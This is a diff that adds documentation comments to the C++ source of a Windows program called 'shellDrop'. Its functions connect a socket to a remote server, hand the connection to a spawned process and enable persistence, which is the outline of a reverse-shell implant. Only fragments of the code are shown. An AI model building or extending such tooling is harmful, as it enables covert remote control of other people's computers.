@@ -2,6 +2,9 @@
 
 #include <iostream>
 
+/**
+ * @brief Construct a new Shell:: Shell object
+ */
 Shell::Shell()
 {
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
@@ -10,11 +13,18 @@ Shell::Shell()
     }
 }
 
+/**
+ * @brief Destroy the Shell:: Shell object
+ */
 Shell::~Shell()
 {
     WSACleanup();
 }
 
+/**
+ * @brief Create a socket object
+ * @return SOCKET -> The created socket object.
+ */
 SOCKET Shell::createSocket()
 {
     SOCKET connectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -25,11 +35,19 @@ SOCKET Shell::createSocket()
     return connectSocket;
 }
 
+/**
+ * @brief Cleanup the socket object
+ * @param socket -> The socket object to cleanup.
+ */
 void Shell::cleanupSocket(SOCKET& socket)
 {
     closesocket(socket);
 }
 
+/**
+ * @brief Handle the connection to the server
+ * @param connectSocket -> The socket object to connect to the server.
+ */
 void Shell::handleConnection(SOCKET& connectSocket)
 {
     const int DEFAULT_BUFLEN = 512;
@@ -63,6 +81,11 @@ void Shell::handleConnection(SOCKET& connectSocket)
     CloseHandle(pinfo.hThread);
 }
 
+/**
+ * @brief Connect to the server
+ * @param remoteServer -> The remote server to connect to.
+ * @param port -> The port to connect to.
+ */
 void Shell::connectToServer(const std::string& remoteServer, int port)
 {
     const int DEFAULT_BUFLEN = 512;
@@ -104,6 +127,9 @@ void Shell::connectToServer(const std::string& remoteServer, int port)
     }
 }
 
+/**
+ * @brief Enable persistence for the shellDrop application
+ */
 void Shell::enablePersistence()
 {
     char currentExePath[MAX_PATH];
